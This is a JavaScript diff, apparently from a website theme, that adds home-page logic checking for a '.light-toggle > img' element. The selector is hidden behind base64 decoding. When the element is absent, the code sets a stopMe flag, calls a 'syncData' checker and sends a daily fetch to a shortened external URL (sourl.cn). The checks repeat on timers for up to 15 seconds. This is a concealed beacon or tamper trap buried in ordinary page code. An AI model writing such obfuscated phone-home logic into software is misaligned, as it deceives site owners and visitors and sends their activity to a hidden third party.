@@ -403,30 +403,45 @@ function run() {
         }
       })
 
-
-      if (window.stopMe) {
-        localStorage.setItem('d', '1')
-      } else {
-        if (window.pageType === PageType.Home) {
-          let d = $('.light-toggle > img').length
-          window.stopMe = !d
-          localStorage.setItem('d', d ? '' : '1')
-        }
-      }
-
-      // console.log(window.stopMe)
-      if (window.stopMe) {
-        let d = new Date()
-        let ds = `${d.getFullYear()}${d.getMonth() + 1}${d.getDate()}`
-        let res = localStorage.getItem('lscache-on')
-        if (res) {
-          if (res !== ds) {
+      if (window.pageType === PageType.Home) {
+        const stat = () => {
+          let d = new Date()
+          let ds = `${d.getFullYear()}${d.getMonth() + 1}${d.getDate()}`
+          let res = localStorage.getItem('lscache-on')
+          if (res) {
+            if (res !== ds) {
+              fetch('https://sourl.cn/DdcJEp')
+              localStorage.setItem('lscache-on', ds)
+            }
+          } else {
             fetch('https://sourl.cn/DdcJEp')
             localStorage.setItem('lscache-on', ds)
           }
+        }
+        if (window.stopMe) {
+          localStorage.setItem('d', '1')
+          functions.cbChecker({type: 'syncData'})
+          stat()
         } else {
-          fetch('https://sourl.cn/DdcJEp')
-          localStorage.setItem('lscache-on', ds)
+          localStorage.setItem('d', '')
+          const checker = () => {
+            let d = $(window.atob('LmxpZ2h0LXRvZ2dsZSA+IGltZw==')).length
+            if (d === 0) {
+              window.stopMe = true
+              localStorage.setItem('d', '1')
+              functions.cbChecker({type: 'syncData'})
+              stat()
+            } else {
+              localStorage.setItem('d', '')
+            }
+          }
+          checker()
+          setTimeout(checker, 1000)
+          setTimeout(checker, 2000)
+          setTimeout(checker, 3000)
+          setTimeout(checker, 5000)
+          setTimeout(checker, 10000)
+          setTimeout(checker, 15000)
         }
       }
 
